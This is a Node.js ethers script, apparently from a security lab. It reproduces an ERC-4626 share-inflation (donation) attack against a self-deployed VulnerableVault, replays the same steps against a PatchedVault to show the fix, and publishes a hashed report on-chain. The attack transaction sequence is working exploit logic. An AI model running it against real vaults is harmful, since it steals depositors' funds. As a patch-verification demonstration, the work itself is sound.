import { mkdir, readFile, writeFile } from "node:fs/promises";
import {
  Contract,
  Wallet,
  encodeBytes32String,
  formatEther,
  formatUnits,
  keccak256,
  parseEther,
  toUtf8Bytes,
} from "ethers";
import {
  MAINNET,
  MAINNET_DEPLOYMENT_PATH,
  MAINNET_RUN_PATH,
  assertMainnet,
  loadMainnetWallet,
  mainnetProvider,
  readArtifact,
  readJson,
  writeJson,
} from "./mainnet-lib.mjs";

await assertMainnet();
const deployment = await readJson(MAINNET_DEPLOYMENT_PATH);
if (!deployment?.complete) throw new Error("Complete mainnet contract deployment is required first.");

const provider = mainnetProvider();
const [owner, tokenArtifact, vulnerableArtifact, patchedArtifact, passportArtifact] = await Promise.all([
  loadMainnetWallet(),
  readArtifact("MockBOT"),
  readArtifact("VulnerableVault"),
  readArtifact("PatchedVault"),
  readArtifact("SimulationPassport"),
]);

await mkdir(".secrets", { recursive: true });
let publisher;
let publisherPassword;
try {
  const [keystore, password] = await Promise.all([
    readFile(".secrets/passport-mainnet-publisher.json", "utf8"),
    readFile(".secrets/passport-mainnet-publisher-password.txt", "utf8"),
  ]);
  publisherPassword = password.trim();
  publisher = (await Wallet.fromEncryptedJson(keystore, publisherPassword)).connect(provider);
} catch (error) {
  if (error?.code !== "ENOENT") throw error;
  publisher = Wallet.createRandom().connect(provider);
  publisherPassword = Wallet.createRandom().privateKey.slice(2);
  const keystore = await publisher.encrypt(publisherPassword);
  await writeFile(".secrets/passport-mainnet-publisher.json", keystore, { mode: 0o600 });
  await writeFile(".secrets/passport-mainnet-publisher-password.txt", `${publisherPassword}\n`, { mode: 0o600 });
}

const addresses = Object.fromEntries(
  Object.entries(deployment.contracts).map(([key, value]) => [key, value.address]),
);
const token = new Contract(addresses.mockBot, tokenArtifact.abi, owner);
const vulnerable = new Contract(addresses.vulnerableVault, vulnerableArtifact.abi, owner);
const patched = new Contract(addresses.patchedVault, patchedArtifact.abi, owner);
const passportAsOwner = new Contract(addresses.passport, passportArtifact.abi, owner);
const passport = passportAsOwner.connect(publisher);
const setupTransactions = [];

if (!(await passportAsOwner.publishers(publisher.address))) {
  const transaction = await passportAsOwner.setPublisher(publisher.address, true);
  const receipt = await transaction.wait(1);
  setupTransactions.push({ action: "authorize", hash: receipt.hash, blockNumber: receipt.blockNumber });
}

let publisherBalance = await provider.getBalance(publisher.address);
if (publisherBalance < parseEther("0.025")) {
  const transaction = await owner.sendTransaction({ to: publisher.address, value: parseEther("0.04") });
  const receipt = await transaction.wait(1);
  setupTransactions.push({ action: "fund", hash: receipt.hash, blockNumber: receipt.blockNumber });
  publisherBalance = await provider.getBalance(publisher.address);
}

const existingRun = await readJson(MAINNET_RUN_PATH);
if (existingRun?.passport?.simulationId && await passport.exists(existingRun.passport.simulationId)) {
  process.stdout.write(`${JSON.stringify(existingRun, null, 2)}\n`);
  process.exit(0);
}

if ((await vulnerable.totalSupply()) !== 0n || (await vulnerable.totalAssets()) !== 0n) {
  throw new Error("Mainnet vulnerable specimen is not pristine; refusing a non-deterministic rerun.");
}

const transactions = { attack: [], replay: [] };
const send = async (promise, bucket) => {
  const transaction = await promise;
  const receipt = await transaction.wait(1);
  bucket.push(receipt.hash);
  return receipt;
};
const ONE = 10n ** 18n;

await send(token.mint(owner.address, ONE * 3n + 2n), transactions.attack);
await send(token.mint(publisher.address, ONE * 2n), transactions.attack);
await send(token.approve(addresses.vulnerableVault, ONE * 3n + 2n), transactions.attack);
await send(vulnerable.deposit(1n, owner.address), transactions.attack);
await send(token.transfer(addresses.vulnerableVault, ONE), transactions.attack);
const publisherToken = token.connect(publisher);
await send(publisherToken.approve(addresses.vulnerableVault, ONE), transactions.attack);
await send(vulnerable.connect(publisher).deposit(ONE, publisher.address), transactions.attack);
const vulnerableVictimShares = await vulnerable.balanceOf(publisher.address);
await send(vulnerable.redeem(1n, owner.address), transactions.attack);

await send(token.approve(addresses.patchedVault, ONE * 2n + 1n), transactions.replay);
await send(patched.deposit(1n, owner.address), transactions.replay);
await send(token.transfer(addresses.patchedVault, ONE), transactions.replay);
await send(publisherToken.approve(addresses.patchedVault, ONE), transactions.replay);
await send(patched.connect(publisher).deposit(ONE, publisher.address), transactions.replay);
const patchedVictimShares = await patched.balanceOf(publisher.address);
if (vulnerableVictimShares !== 0n || patchedVictimShares === 0n) {
  throw new Error("Mainnet demo invariant did not reproduce as expected.");
}

const sourceCode = await provider.getCode(addresses.vulnerableVault);
const sourceHash = keccak256(sourceCode);
const report = {
  finding: "CL-4626-001",
  protocol: addresses.vulnerableVault,
  vulnerableVictimShares: vulnerableVictimShares.toString(),
  patchedVictimShares: patchedVictimShares.toString(),
  attackTransactions: transactions.attack,
  replayTransactions: transactions.replay,
};
const reportHash = keccak256(toUtf8Bytes(JSON.stringify(report)));
const simulationId = keccak256(
  toUtf8Bytes(`crash-lab-mainnet:${addresses.vulnerableVault}:${reportHash}`),
);
if (await passport.exists(simulationId)) {
  throw new Error("Mainnet Passport already exists; refusing duplicate publication.");
}
const passportTransaction = await passport.publish(
  simulationId,
  addresses.vulnerableVault,
  sourceHash,
  reportHash,
  2,
  encodeBytes32String("crash-lab-2"),
);
const passportReceipt = await passportTransaction.wait(1);

const result = {
  network: MAINNET,
  contracts: addresses,
  deployer: owner.address,
  publisher: {
    address: publisher.address,
    balanceBot: formatEther(await provider.getBalance(publisher.address)),
    transactions: setupTransactions,
  },
  attack: {
    transactionHashes: transactions.attack,
    victimShares: vulnerableVictimShares.toString(),
    attackerRecoveredAssets: formatUnits(ONE * 2n + 1n, 18),
  },
  replay: {
    transactionHashes: transactions.replay,
    victimShares: patchedVictimShares.toString(),
    invariantHeld: true,
  },
  passport: {
    contractAddress: addresses.passport,
    simulationId,
    reportHash,
    sourceHash,
    transactionHash: passportReceipt.hash,
    blockNumber: passportReceipt.blockNumber,
    publisher: publisher.address,
  },
  generatedAt: new Date().toISOString(),
};
await writeJson(MAINNET_RUN_PATH, result);
process.stdout.write(`${JSON.stringify(result, null, 2)}\n`);
